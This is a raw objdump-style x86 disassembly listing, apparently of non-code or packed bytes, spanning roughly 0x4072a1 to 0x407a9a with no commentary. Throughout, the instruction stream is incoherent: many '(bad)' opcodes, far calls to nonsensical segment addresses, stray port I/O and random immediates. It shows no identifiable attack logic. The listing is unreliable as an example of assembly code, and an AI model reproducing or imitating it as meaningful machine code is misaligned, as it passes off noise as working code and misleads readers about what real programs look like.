  4072a1:	jg     0x4072c8
  4072a3:	popa   
  4072a4:	and    eax,0x99b7591b
  4072a9:	test   eax,0xde0af079
  4072ae:	mov    ah,0x8b
  4072b0:	(bad)  
  4072b2:	inc    eax
  4072b3:	imul   esp,DWORD PTR [ecx+0x5ba337c1],0x79
  4072ba:	addr16 lock loope 0x407306
  4072be:	outs   dx,BYTE PTR ds:[esi]
  4072bf:	(bad)  
  4072c0:	scas   al,BYTE PTR es:[edi]
  4072c1:	xchg   ebp,eax
  4072c2:	mov    esp,0xf9ad2cb
  4072c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c8:	xchg   esp,eax
  4072c9:	call   0xc7c1:0x8f3e75f7
  4072d0:	and    eax,0x78b94e23
  4072d5:	jno    0x40727c
  4072d7:	jmp    0x40727d
  4072d9:	nop
  4072da:	shr    BYTE PTR [ecx+0x172d1e18],cl
  4072e0:	jae    0x4072e4
  4072e2:	mov    edx,0x80f1774
  4072e7:	(bad)  
  4072e8:	cmc    
  4072e9:	mov    bh,0x1a
  4072eb:	xor    DWORD PTR [ecx],edi
  4072ed:	jno    0x407365
  4072ef:	stos   DWORD PTR es:[edi],eax
  4072f0:	adc    DWORD PTR [ebx-0xd02e9fe],esp
  4072f6:	dec    esp
  4072f7:	mov    ebx,0x8089d445
  4072fc:	push   ebx
  4072fd:	mov    ah,0x66
  4072ff:	in     al,0xc8
  407301:	in     al,0x82
  407303:	cmp    DWORD PTR [ebx],ebp
  407305:	addr16 xchg esp,eax
  407307:	add    ecx,ebx
  407309:	repnz stos BYTE PTR es:[edi],al
  40730b:	and    ecx,DWORD PTR [esp]
  40730e:	mov    BYTE PTR [edi+0x4a3bd39c],0x3b
  407315:	dec    ecx
  407316:	sub    eax,0x45c84c3b
  40731b:	sbb    al,0x5f
  40731d:	add    eax,0x49b984ff
  407322:	icebp  
  407323:	inc    ebp
  407324:	imul   ebx,DWORD PTR [esi],0xb3134a2
  40732a:	stc    
  40732b:	mov    edx,edi
  40732d:	sub    al,0x94
  40732f:	ins    DWORD PTR es:[edi],dx
  407330:	dec    ebx
  407331:	sbb    al,0xa5
  407333:	sbb    eax,0xf59b7a91
  407338:	(bad)  
  407339:	push   edx
  40733a:	(bad)  
  40733c:	leave  
  40733d:	aas    
  40733e:	jo     0x4072e1
  407340:	out    dx,al
  407341:	mov    ch,0xad
  407343:	sub    bh,BYTE PTR [edx+eax*4-0x4a]
  407347:	push   edi
  407348:	dec    edi
  407349:	iret   
  40734a:	sub    DWORD PTR [ecx-0x4],ecx
  40734d:	jmp    0xc329:0xab3c7351
  407354:	and    BYTE PTR [ebx],bh
  407356:	or     ecx,0x6bb166b1
  40735c:	or     cl,BYTE PTR [ecx-0x3]
  40735f:	push   ds
  407360:	test   al,0xad
  407362:	scas   al,BYTE PTR es:[edi]
  407363:	(bad)  
  407364:	mov    edx,0x1fa1d58a
  407369:	or     BYTE PTR [ecx+0x52b6517a],cl
  40736f:	popa   
  407370:	mov    BYTE PTR [edi-0x6],ah
  407373:	in     eax,dx
  407374:	xchg   ebx,eax
  407375:	jno    0x4073c3
  407377:	xchg   ecx,eax
  407378:	(bad)  
  407379:	fidiv  WORD PTR [edx]
  40737b:	push   cs
  40737c:	jno    0x407346
  40737e:	arpl   WORD PTR [eax-0x17a81b2e],ax
  407384:	inc    edx
  407385:	dec    edx
  407386:	popa   
  407387:	call   0xd33d07bd
  40738c:	sbb    DWORD PTR [esi],eax
  40738e:	and    BYTE PTR [ebx-0x29],cl
  407391:	xor    al,0xb7
  407393:	das    
  407394:	sbb    BYTE PTR [edx-0x77],al
  407397:	inc    ebx
  407398:	pop    esi
  407399:	(bad)  
  40739a:	es push esi
  40739c:	lods   al,BYTE PTR ds:[esi]
  40739d:	rcl    esi,cl
  40739f:	rcl    DWORD PTR [esi+0x6a],cl
  4073a2:	dec    edi
  4073a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073a4:	scas   al,BYTE PTR es:[edi]
  4073a5:	sbb    DWORD PTR [edx-0x4b],ebp
  4073a8:	nop
  4073a9:	xor    DWORD PTR [edx-0x6c103434],esi
  4073af:	dec    eax
  4073b0:	lods   al,BYTE PTR ds:[esi]
  4073b1:	mov    ebx,0xbc871a50
  4073b6:	mov    ds:0x43c8de02,al
  4073bb:	outs   dx,BYTE PTR ds:[esi]
  4073bc:	mov    DWORD PTR [esi],ebx
  4073be:	repnz in eax,dx
  4073c0:	add    eax,0x8b67f618
  4073c5:	(bad)
  4073c8:	outs   dx,BYTE PTR ds:[esi]
  4073c9:	push   0xffffffa7
  4073cb:	mov    dl,0x4b
  4073cd:	adc    edx,ebp
  4073cf:	sbb    dh,BYTE PTR [edx-0x73]
  4073d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073d3:	xor    eax,0x1c9574a5
  4073d8:	mov    fs,edx
  4073da:	push   ebp
  4073db:	jo     0x407444
  4073dd:	imul   esp,DWORD PTR [eax],0x15bbe84d
  4073e3:	bnd jp 0x407460
  4073e6:	dec    ecx
  4073e7:	cdq    
  4073e8:	xor    dh,BYTE PTR [edx]
  4073ea:	mov    cl,0x3c
  4073ec:	inc    eax
  4073ed:	out    dx,al
  4073ee:	daa    
  4073ef:	mov    ds:0x2829f486,al
  4073f4:	or     eax,0xd65e354
  4073f9:	xor    al,0x28
  4073fb:	les    ebx,FWORD PTR [edx]
  4073fd:	jnp    0x407424
  4073ff:	lock inc eax
  407401:	add    al,0xf1
  407403:	int3   
  407404:	aas    
  407405:	lods   eax,DWORD PTR ds:[esi]
  407406:	inc    ecx
  407407:	cmp    eax,0x20a127a7
  40740c:	hlt    
  40740d:	jbe    0x407447
  40740f:	inc    esi
  407410:	repz add bh,BYTE PTR [eax]
  407413:	mov    BYTE PTR [edi-0x65],0xd0
  407417:	mov    al,0x55
  407419:	dec    eax
  40741a:	and    ecx,DWORD PTR [edi-0x66]
  40741d:	mov    esi,0xc47983d8
  407422:	mov    ds:0x2dbf7836,al
  407427:	inc    eax
  407428:	out    dx,al
  407429:	push   cs
  40742a:	(bad)  [edi]
  40742c:	fidiv  DWORD PTR [ecx+0x584d2c6]
  407432:	jbe    0x4073f4
  407434:	call   0x92c4:0x52334c6b
  40743b:	mov    al,0xcd
  40743d:	mov    al,BYTE PTR [edx]
  40743f:	(bad)  
  407440:	fnop   
  407442:	push   ebp
  407443:	or     BYTE PTR [ecx-0x5bc395a0],bl
  407449:	call   0x361311f
  40744e:	mov    edx,0xff01e58c
  407453:	mov    edx,0xade2088c
  407458:	xchg   edx,eax
  407459:	lods   al,BYTE PTR ds:[esi]
  40745a:	sub    eax,0xbc3eef9f
  40745f:	or     ebx,DWORD PTR ds:0xc1b7b769
  407465:	cmp    ah,cl
  407467:	sub    DWORD PTR [eax+0x42],ecx
  40746a:	mov    cl,0xb6
  40746c:	mov    ds:0x7eac2536,al
  407471:	mov    eax,ds:0xe6805152
  407476:	or     eax,0x75892b77
  40747b:	mov    cl,0x23
  40747d:	mov    eax,0x6eddf3a7
  407482:	adc    BYTE PTR [ebp-0x2f784ac],dl
  407488:	ins    BYTE PTR es:[edi],dx
  407489:	call   0x54646ac1
  40748e:	add    esp,DWORD PTR [ebx+edi*1-0x60bb30de]
  407495:	arpl   di,bx
  407497:	in     al,0x5f
  407499:	and    BYTE PTR [esi],0xf5
  40749c:	mov    ebp,DWORD PTR [ecx-0x1a]
  40749f:	and    ch,BYTE PTR [ecx]
  4074a1:	adc    bl,ch
  4074a3:	pop    esp
  4074a4:	in     al,0xcd
  4074a6:	test   al,0x94
  4074a8:	jl     0x4074c7
  4074aa:	rcr    DWORD PTR [edx+0x2eeac610],0x99
  4074b1:	iret   
  4074b2:	fnsave [edx+0x5c6a5aa5]
  4074b8:	xchg   ecx,eax
  4074b9:	adc    al,0x5c
  4074bb:	add    dl,BYTE PTR [esi]
  4074bd:	push   es
  4074be:	bound  esp,QWORD PTR [ecx-0x63]
  4074c1:	mov    esi,0x9af56d6c
  4074c6:	sbb    ah,BYTE PTR [esi]
  4074c8:	popa   
  4074c9:	xor    eax,0x76455454
  4074ce:	xor    DWORD PTR [esi],esp
  4074d0:	loopne 0x407491
  4074d2:	leave  
  4074d3:	add    bh,BYTE PTR [ebp+0x77]
  4074d6:	cmp    al,BYTE PTR [edx]
  4074d8:	and    al,0x81
  4074da:	sbb    DWORD PTR [eax-0x3f],esi
  4074dd:	xchg   edx,eax
  4074de:	test   eax,0xa2a5bfdf
  4074e3:	shr    DWORD PTR [ebx+0xd39e5b6],1
  4074e9:	(bad)  
  4074ea:	loopne 0x407496
  4074ec:	xor    DWORD PTR [edi+0x36],ebp
  4074ef:	loopne 0x4074d7
  4074f1:	ins    BYTE PTR es:[edi],dx
  4074f2:	push   ecx
  4074f3:	sbb    al,0x87
  4074f5:	ins    DWORD PTR es:[edi],dx
  4074f6:	push   cs
  4074f7:	sub    ch,BYTE PTR [ebx+0x18d5f96a]
  4074fd:	ds cwde 
  4074ff:	dec    eax
  407500:	into   
  407501:	nop
  407502:	inc    esi
  407503:	lods   al,BYTE PTR fs:[esi]
  407505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407506:	inc    edx
  407507:	cli    
  407508:	es cdq 
  40750a:	or     eax,0xdeeb1079
  40750f:	clc    
  407510:	out    dx,eax
  407511:	popf   
  407512:	xor    ebp,0x23
  407515:	ins    DWORD PTR es:[edi],dx
  407516:	cmp    ebp,DWORD PTR [edx]
  407518:	pop    esp
  407519:	iret   
  40751a:	es sub eax,0x609af2d4
  407520:	imul   esi,DWORD PTR [edx+eax*4],0x8b38eb6f
  407527:	push   ebx
  407528:	ret    
  407529:	dec    ebp
  40752a:	cmp    dl,BYTE PTR [ebx]
  40752c:	popf   
  40752d:	jo     0x40755c
  40752f:	pop    esp
  407530:	adc    BYTE PTR [edx-0x2ff33e45],0x8b
  407537:	(bad)  
  407538:	jge    0x407574
  40753a:	mov    ah,0x7d
  40753c:	adc    al,0x89
  40753e:	pop    ecx
  40753f:	retf   
  407540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407541:	mov    edi,0x629c20f
  407546:	addr16 jae 0x4075ba
  407549:	xlat   BYTE PTR ds:[ebx]
  40754a:	sbb    bl,dl
  40754c:	fisub  WORD PTR [ebx]
  40754e:	not    DWORD PTR ds:0x7b3fc025
  407554:	mov    WORD PTR [edx+0x279672bf],ss
  40755a:	jmp    0x7b913910
  40755f:	cwde   
  407560:	xlat   BYTE PTR ds:[ebx]
  407561:	call   0x705b:0x7344b8bb
  407568:	jge    0x407584
  40756a:	(bad)  
  40756b:	and    BYTE PTR [esi-0x6ffdb80d],bl
  407571:	mov    bl,BYTE PTR [ebp+esi*2-0x6a4be020]
  407578:	jmp    0x4075bc
  40757a:	shl    DWORD PTR [ecx-0x53dd4233],1
  407580:	cmc    
  407581:	repz les edx,FWORD PTR [esi]
  407584:	retf   
  407585:	arpl   WORD PTR [edi+0x6c8fa9cb],di
  40758b:	lods   al,BYTE PTR ds:[esi]
  40758c:	fcmovnu st,st(3)
  40758e:	pop    esp
  40758f:	sbb    al,0x89
  407591:	loopne 0x4075b3
  407593:	push   ss
  407594:	shl    BYTE PTR [ebp+esi*1-0x38],0x4d
  407599:	adc    eax,0x36ad0b9c
  40759e:	jne    0x407578
  4075a0:	ret    0xf29b
  4075a3:	add    al,0x19
  4075a5:	mov    ds:0xf98bb9d0,al
  4075aa:	ficom  DWORD PTR [edi-0x4f540f24]
  4075b0:	loope  0x407618
  4075b2:	cmp    esi,DWORD PTR [eax]
  4075b4:	popa   
  4075b5:	mov    edx,ebp
  4075b7:	ror    DWORD PTR [ebx-0x71],0xe5
  4075bb:	xor    al,BYTE PTR [eax]
  4075bd:	not    esi
  4075bf:	stc    
  4075c0:	mov    eax,0x11d728d1
  4075c5:	popa   
  4075c6:	faddp  st(0),st
  4075c8:	lea    eax,[ebx]
  4075ca:	sub    DWORD PTR [edx+0x1c],ebp
  4075cd:	jle    0x4075ce
  4075cf:	or     ah,cl
  4075d1:	xchg   esp,eax
  4075d2:	stc    
  4075d3:	pop    ecx
  4075d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075d5:	arpl   WORD PTR [edx],sp
  4075d7:	adc    ebx,ecx
  4075d9:	rol    DWORD PTR [esi],cl
  4075db:	jmp    0xb3b9:0xf1f8d806
  4075e2:	(bad)  
  4075e3:	std    
  4075e4:	dec    eax
  4075e5:	rol    BYTE PTR [edi],cl
  4075e7:	pop    eax
  4075e8:	out    dx,al
  4075e9:	cs sbb dh,al
  4075ec:	sub    eax,0x95132133
  4075f1:	mov    ch,0xd7
  4075f3:	ins    DWORD PTR es:[edi],dx
  4075f4:	into   
  4075f5:	lahf   
  4075f6:	cs stc 
  4075f8:	mov    cl,0x71
  4075fa:	xor    eax,0x5c465a01
  4075ff:	imul   edx,esi,0x23
  407602:	jl     0x4075cf
  407604:	xor    dh,cl
  407606:	mov    ebp,0xf8b69080
  40760b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40760c:	(bad)  
  40760d:	cmp    DWORD PTR ds:0x6d5eb9b8,esi
  407613:	std    
  407614:	inc    ebp
  407615:	aam    0x20
  407617:	ds pop es
  407619:	mov    ah,0xfe
  40761b:	inc    ebp
  40761c:	addr16 (bad) 
  40761e:	sub    bh,BYTE PTR [ebp+edx*4-0x2b]
  407622:	adc    al,0xf5
  407624:	push   ecx
  407625:	mov    ch,0xa0
  407627:	(bad)  
  407628:	mov    BYTE PTR [ebx-0x6b422af6],dh
  40762e:	mov    eax,0xd4f19254
  407633:	pop    ds
  407634:	mov    esp,DWORD PTR [ebx]
  407636:	cmp    ch,BYTE PTR [eax]
  407638:	stc    
  407639:	mov    ds:0xf4e5da33,al
  40763e:	inc    esi
  40763f:	mov    dl,0xc0
  407641:	sub    BYTE PTR [esi-0x249cbaac],cl
  407647:	jb     0x407656
  407649:	cmp    BYTE PTR [esi],ah
  40764b:	shr    BYTE PTR [edx+eax*4+0x7d],1
  40764f:	pop    edi
  407650:	mov    bl,0x36
  407652:	add    bh,BYTE PTR [ebp+0x58f78fab]
  407658:	add    eax,0x69193a4d
  40765d:	shl    DWORD PTR [edi],0x0
  407660:	inc    esp
  407661:	xor    eax,0x6f8b13ba
  407666:	test   al,0xf5
  407668:	idiv   al
  40766a:	mov    gs,ecx
  40766c:	int    0xbc
  40766e:	fild   WORD PTR [edx-0x2a681e78]
  407674:	jmp    0x407697
  407676:	cmp    edx,ebx
  407678:	or     DWORD PTR [eax+0xa],esp
  40767b:	test   al,cl
  40767d:	addr16 push ss
  40767f:	mov    bl,0x67
  407681:	ss data16 jg 0x407652
  407685:	pop    ss
  407686:	int3   
  407687:	sahf   
  407688:	mov    DWORD PTR [esi],0xeedb9b4f
  40768e:	jnp    0x407610
  407690:	mov    edi,0x73d73e89
  407695:	enter  0xa1d5,0xb
  407699:	mov    al,ds:0x44265797
  40769e:	lds    ebp,FWORD PTR [esi+0x1c8b0ae8]
  4076a4:	sub    eax,DWORD PTR [ecx+0x7d378786]
  4076aa:	fisttp QWORD PTR [ebx-0x47bd2c26]
  4076b0:	adc    eax,0xcd4c355a
  4076b5:	das    
  4076b6:	dec    ebx
  4076b7:	ja     0x4076bc
  4076b9:	sbb    al,0x9b
  4076bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076bc:	pop    DWORD PTR [eax+0x1f]
  4076bf:	into   
  4076c0:	adc    ebx,DWORD PTR [eax-0x3]
  4076c3:	push   eax
  4076c4:	or     edx,DWORD PTR [eax+esi*4]
  4076c7:	mov    esp,0x49540654
  4076cc:	int    0x93
  4076ce:	sbb    sp,WORD PTR [edx+0x11131644]
  4076d5:	pop    ss
  4076d6:	xlat   BYTE PTR ds:[ebx]
  4076d7:	pop    eax
  4076d8:	inc    eax
  4076d9:	repnz das 
  4076db:	(bad)  
  4076dc:	jl     0x40765f
  4076de:	aas    
  4076df:	adc    edx,DWORD PTR ds:0x3068e6bd
  4076e5:	fidiv  WORD PTR [eax]
  4076e7:	adc    DWORD PTR [esi+0x73972934],edi
  4076ed:	mov    ds:0x4745a87b,eax
  4076f2:	push   edi
  4076f3:	push   ebx
  4076f4:	add    eax,0xe2da3e20
  4076f9:	cmp    eax,DWORD PTR [edi+0x48e6a9be]
  4076ff:	dec    esp
  407700:	dec    edx
  407701:	cld    
  407702:	mov    ch,0x43
  407704:	mov    ch,0x14
  407706:	sbb    al,0x81
  407708:	cmp    ecx,DWORD PTR [edi+0x2f4d2e22]
  40770e:	int3   
  40770f:	mov    ch,0xdc
  407711:	ins    DWORD PTR es:[edi],dx
  407712:	daa    
  407713:	mov    ch,0xb
  407715:	ror    cl,0x95
  407718:	push   edi
  407719:	jl     0x407731
  40771b:	les    edx,FWORD PTR [ecx]
  40771d:	jmp    0xb9c2790d
  407722:	pop    esi
  407723:	add    dl,BYTE PTR [eax]
  407725:	into   
  407726:	and    cl,cl
  407728:	and    al,0xb2
  40772a:	int    0x36
  40772c:	jmp    0x407773
  40772e:	js     0x40775d
  407730:	inc    esi
  407731:	xchg   edx,eax
  407732:	and    edx,ecx
  407734:	aam    0xf
  407736:	add    BYTE PTR [edx-0x4a67bb7e],al
  40773c:	sbb    DWORD PTR [ecx+esi*2-0x13faae37],ecx
  407743:	and    edx,DWORD PTR [esi-0x8]
  407746:	sbb    bh,BYTE PTR [eax-0x6]
  407749:	iret   
  40774a:	xchg   ebx,eax
  40774b:	xor    edi,0x5ec25c92
  407751:	repz rcr BYTE PTR [ebx-0x681997c7],cl
  407758:	pop    ds
  407759:	(bad)  
  40775a:	add    al,0x2f
  40775c:	movlps xmm6,QWORD PTR [eax]
  40775f:	add    ebx,ebx
  407761:	mov    ds:0x692ab9e2,al
  407766:	cmc    
  407767:	cmp    DWORD PTR [esi+edi*8+0x44],edi
  40776b:	push   ebx
  40776c:	or     eax,0x851877d3
  407771:	add    eax,0xea323707
  407776:	inc    ebx
  407777:	sbb    DWORD PTR [ebp-0x6d],esp
  40777a:	inc    esp
  40777b:	or     ecx,DWORD PTR [edx+0x4e]
  40777e:	aad    0x9a
  407780:	add    esi,DWORD PTR ds:0x92b68cb
  407786:	jecxz  0x40775b
  407788:	repnz retf 0x6408
  40778c:	mov    ecx,0x596451d0
  407791:	push   ss
  407792:	mov    ds:0xe78b071f,eax
  407797:	cmc    
  407798:	cmp    DWORD PTR [ecx],0xffffffff
  40779b:	mov    ch,0x0
  40779d:	lea    ecx,[edx]
  40779f:	pop    es
  4077a0:	and    dl,0xd2
  4077a3:	mov    esi,0x47bd6fac
  4077a8:	adc    al,0x62
  4077aa:	push   eax
  4077ab:	dec    edx
  4077ac:	in     al,dx
  4077ad:	mov    edi,0xc5dcf8bb
  4077b2:	rol    BYTE PTR [ebx-0x4b],cl
  4077b5:	gs jp  0x407771
  4077b8:	sahf   
  4077b9:	jno    0x40782e
  4077bb:	retf   0x2d3
  4077be:	imul   edi,DWORD PTR [ebx],0xffffffc6
  4077c1:	pop    ebp
  4077c2:	and    cl,dh
  4077c4:	(bad)  
  4077c5:	mov    esp,0xa0cab98c
  4077ca:	es jp  0x407848
  4077cd:	sub    bh,bh
  4077cf:	ret    0x6459
  4077d2:	xor    DWORD PTR [edi-0x3761d2c],ebx
  4077d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d9:	mov    DWORD PTR [esi+0x486c676a],ebp
  4077df:	not    BYTE PTR [ecx-0x7b0497b3]
  4077e5:	fild   DWORD PTR [ecx]
  4077e7:	fidiv  WORD PTR [ecx]
  4077e9:	iret   
  4077ea:	out    0x38,eax
  4077ec:	xchg   ebx,eax
  4077ed:	int3   
  4077ee:	xchg   ebx,eax
  4077ef:	(bad)
  4077f3:	leave  
  4077f4:	fwait
  4077f5:	ja     0x407782
  4077f7:	nop
  4077f8:	add    eax,0xe041d74e
  4077fd:	stos   DWORD PTR es:[edi],eax
  4077fe:	ja     0x407807
  407800:	sbb    dh,dl
  407802:	imul   ecx,DWORD PTR [edi+0x31],0xc5b7664
  407809:	pop    edi
  40780a:	icebp  
  40780b:	inc    esp
  40780c:	mov    ebx,ecx
  40780e:	xchg   ecx,esp
  407810:	cmp    al,0x82
  407812:	or     edx,edi
  407814:	jae    0x4077cb
  407816:	lock jl 0x407894
  407819:	jns    0x40783b
  40781b:	shl    BYTE PTR [ebp+0x56fa6201],cl
  407821:	sbb    eax,0xf21e3d8a
  407826:	mov    dh,0xa7
  407828:	mov    ebp,0x1d471dc1
  40782d:	or     eax,0x1d02eec9
  407832:	mov    di,0x51cc
  407836:	test   DWORD PTR [edi+0x77c4acdf],ebp
  40783c:	fnstenv [ebp+0x41]
  40783f:	sbb    DWORD PTR [esp+edx*1-0x5cc28e01],0xffffffc0
  407847:	cmp    dh,cl
  407849:	xchg   ecx,eax
  40784a:	scas   al,BYTE PTR es:[edi]
  40784b:	sub    al,0x5a
  40784d:	xlat   BYTE PTR ds:[ebx]
  40784e:	mov    esp,0xedf3a2cc
  407853:	lahf   
  407854:	lods   eax,DWORD PTR ds:[esi]
  407855:	loope  0x407836
  407857:	push   edi
  407858:	out    0x85,al
  40785a:	add    dh,BYTE PTR [eax]
  40785c:	adc    ah,bl
  40785e:	push   es
  40785f:	jge    0x4078b4
  407861:	test   BYTE PTR [edi-0x151991a],dh
  407867:	aas    
  407868:	push   eax
  407869:	scas   eax,DWORD PTR es:[edi]
  40786a:	call   0xab3c:0x268e8b3e
  407871:	in     al,0x92
  407873:	lock cmp eax,0x351bd4f0
  407879:	jae    0x4078bc
  40787b:	push   eax
  40787c:	adc    dl,BYTE PTR ds:0xc2035fa
  407882:	cwde   
  407883:	in     al,dx
  407884:	mov    cl,0xd1
  407886:	xchg   ebx,eax
  407887:	call   FWORD PTR [edi-0x21]
  40788a:	inc    esi
  40788b:	scas   eax,DWORD PTR es:[edi]
  40788c:	sbb    BYTE PTR [edx-0x13],bl
  40788f:	int3   
  407890:	std    
  407891:	and    DWORD PTR [esi],ebx
  407893:	sub    al,0xfe
  407895:	les    ecx,FWORD PTR [edi]
  407897:	dec    ecx
  407898:	push   ecx
  407899:	pop    ebp
  40789a:	adc    bl,BYTE PTR es:[edx]
  40789d:	fcomi  st,st(5)
  40789f:	or     al,0xd8
  4078a1:	or     ecx,DWORD PTR ds:0x5f0cb1e1
  4078a7:	fisttp WORD PTR [ecx-0xca09a68]
  4078ad:	sub    eax,0xab226ef8
  4078b2:	and    BYTE PTR [ebp+0x1db14e02],0x91
  4078b9:	gs cli 
  4078bb:	sub    eax,0x7e6e60b9
  4078c0:	xor    DWORD PTR [ebp+0x61d2fe63],0x7d62ccd9
  4078ca:	pop    edi
  4078cb:	out    dx,al
  4078cc:	jle    0x407946
  4078ce:	imul   edi,DWORD PTR [esi-0x6cfb3cb7],0x74
  4078d5:	dec    edi
  4078d6:	mov    BYTE PTR [eax+edi*2+0x52],0xc
  4078db:	dec    esp
  4078dc:	ret    0x9b26
  4078df:	popa   
  4078e0:	mov    ecx,DWORD PTR [edx]
  4078e2:	mov    ch,0x0
  4078e4:	mov    ch,0x1a
  4078e6:	dec    esi
  4078e7:	cli    
  4078e8:	pop    edx
  4078e9:	mov    esi,0x39eeb77b
  4078ee:	enter  0x7091,0x5d
  4078f2:	(bad)  
  4078f3:	fisubr DWORD PTR [edx+0x155de769]
  4078f9:	cmp    DWORD PTR [edi],edx
  4078fb:	leave  
  4078fc:	into   
  4078fd:	stos   BYTE PTR es:[edi],al
  4078fe:	mov    esp,0x51bf7887
  407903:	test   eax,0xef2c586d
  407908:	xchg   esi,eax
  407909:	in     eax,dx
  40790a:	leave  
  40790b:	sbb    al,0xae
  40790d:	mov    BYTE PTR fs:[esi-0x26],dh
  407911:	or     BYTE PTR [ebx+0x3ed5c416],bh
  407917:	jae    0x407903
  407919:	xchg   esp,eax
  40791a:	aad    0x52
  40791c:	dec    ebx
  40791d:	adc    DWORD PTR ds:0x9d358817,edi
  407923:	xchg   ebp,eax
  407924:	sub    DWORD PTR [esi+0x41c5a3],esp
  40792a:	(bad)  
  40792b:	out    0x2f,eax
  40792d:	mov    edx,DWORD PTR [ebx-0x45]
  407930:	mul    esp
  407932:	ins    DWORD PTR es:[edi],dx
  407933:	mov    cl,0x3a
  407935:	pop    ds
  407936:	enter  0xb383,0x7c
  40793a:	adc    esp,edi
  40793c:	mov    DWORD PTR [edi],0x3f39abc6
  407942:	jae    0x4079a5
  407944:	fs jno 0x407905
  407947:	xor    al,0x2d
  407949:	lds    ecx,FWORD PTR [esi+0x1c]
  40794c:	mov    al,ds:0xcfde8b80
  407951:	imul   esp,DWORD PTR [ebp-0x6b8b7385],0xffffff89
  407958:	mov    esp,DWORD PTR [edx+0x40de0ace]
  40795e:	inc    edx
  40795f:	and    DWORD PTR [ebx+0x5],edi
  407962:	ret    0x8afe
  407965:	repz loop 0x407947
  407968:	push   edi
  407969:	sbb    BYTE PTR [ebx],0xe2
  40796c:	pop    ebx
  40796d:	pop    es
  40796e:	cmp    al,0xf5
  407970:	jge    0x4079a7
  407972:	sub    al,0x24
  407974:	and    eax,0xb8a0a0d6
  407979:	sub    al,0xa
  40797b:	mov    ecx,0x891b511
  407980:	mov    al,ds:0x2b788520
  407985:	outs   dx,DWORD PTR ds:[esi]
  407986:	fnsave [edi+ebx*1+0x6c]
  40798a:	shr    DWORD PTR [edx+eiz*8],cl
  40798d:	xchg   DWORD PTR cs:[edi-0x66b29c57],ebp
  407994:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407996:	test   BYTE PTR ds:[ecx+ebp*1],ch
  40799a:	int    0x19
  40799c:	retf   0x5d47
  40799f:	push   esp
  4079a0:	sub    ah,BYTE PTR [ecx+0x3981c0c1]
  4079a6:	mov    ebx,0x358a880f
  4079ab:	or     DWORD PTR [ebx+edi*1+0x28704c57],edx
  4079b2:	sar    BYTE PTR [eax+esi*4],0xba
  4079b6:	loopne 0x4079ab
  4079b8:	push   edx
  4079b9:	addr16 dec edx
  4079bb:	clc    
  4079bc:	xor    DWORD PTR [edx-0x54],edi
  4079bf:	push   ss
  4079c0:	outs   dx,DWORD PTR ds:[esi]
  4079c1:	mov    edi,0xa56c65d2
  4079c6:	cld    
  4079c7:	aas    
  4079c8:	xchg   esi,eax
  4079c9:	push   0xaccb9ac3
  4079ce:	fcmovnu st,st(2)
  4079d0:	xchg   DWORD PTR [ecx],ebx
  4079d2:	rcl    BYTE PTR [edx-0xf804f7b],cl
  4079d8:	sub    BYTE PTR [ebx],bl
  4079da:	pop    es
  4079db:	push   cs
  4079dc:	adc    eax,0x429a8daf
  4079e1:	sahf   
  4079e2:	or     DWORD PTR [esi],ecx
  4079e4:	mov    ds:0xa78d9a44,al
  4079e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ea:	push   eax
  4079eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ec:	mov    DWORD PTR [ebx],ebx
  4079ee:	pop    ds
  4079ef:	iret   
  4079f0:	std    
  4079f1:	mov    dh,0xb9
  4079f3:	mov    cs,WORD PTR [ebx-0x7c]
  4079f6:	les    edx,FWORD PTR [ebp-0x25]
  4079f9:	fsub   st,st(7)
  4079fb:	fndisi(8087 only) 
  4079fd:	fmul   st(7),st
  4079ff:	std    
  407a00:	mul    DWORD PTR [ecx]
  407a02:	sub    eax,0x3ea85b52
  407a07:	jle    0x4079be
  407a09:	repz lea ebx,[ecx+0x25]
  407a0d:	pushf  
  407a0e:	fild   QWORD PTR [edi-0x4f5d0d0d]
  407a14:	sbb    al,0x76
  407a16:	div    al
  407a18:	inc    eax
  407a19:	sbb    al,0xf2
  407a1b:	aaa    
  407a1c:	or     eax,0x967ecbd8
  407a21:	loope  0x407a96
  407a23:	mov    esi,0xb1881d20
  407a28:	or     eax,0x34642291
  407a2d:	popa   
  407a2e:	or     eax,0x2bc3bd54
  407a33:	xor    BYTE PTR [ecx],bl
  407a35:	mov    eax,0x7684935
  407a3a:	mov    cl,0x71
  407a3c:	imul   esi,DWORD PTR [ebp-0x3723a583],0xfffffffa
  407a43:	nop
  407a44:	in     eax,dx
  407a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a46:	les    esi,FWORD PTR [ecx+edi*2]
  407a49:	cld    
  407a4a:	scas   eax,DWORD PTR es:[edi]
  407a4b:	jb     0x407aa7
  407a4d:	stc    
  407a4e:	sbb    dl,bl
  407a50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a51:	fdivr  DWORD PTR [eax+0x4d]
  407a54:	push   ecx
  407a55:	loop   0x407a4e
  407a57:	cmp    DWORD PTR [esi+0x4bb2c8b5],eax
  407a5d:	icebp  
  407a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a5f:	fstp   QWORD PTR [ebx+0x6b]
  407a62:	mov    edx,eax
  407a64:	cmp    eax,0x9a7a0fd8
  407a69:	or     BYTE PTR [edi],al
  407a6b:	mov    eax,0xe16366e7
  407a70:	test   edx,ebp
  407a72:	sbb    ebx,DWORD PTR [esi-0x1f]
  407a75:	pop    esp
  407a76:	aam    0x45
  407a78:	mov    bl,0x38
  407a7a:	jmp    0x646a:0xb9696586
  407a81:	pushf  
  407a82:	push   ecx
  407a83:	add    esi,ecx
  407a85:	sbb    BYTE PTR [ecx+0x57],al
  407a88:	ss and bh,ah
  407a8b:	xlat   BYTE PTR ds:[ebx]
  407a8c:	pusha  
  407a8d:	(bad)  
  407a8f:	stos   BYTE PTR es:[edi],al
  407a90:	push   esp
  407a91:	fisttp WORD PTR [esi+eiz*1-0x7c1fc294]
  407a98:	fucom  st(5)
  407a9a:	push   es
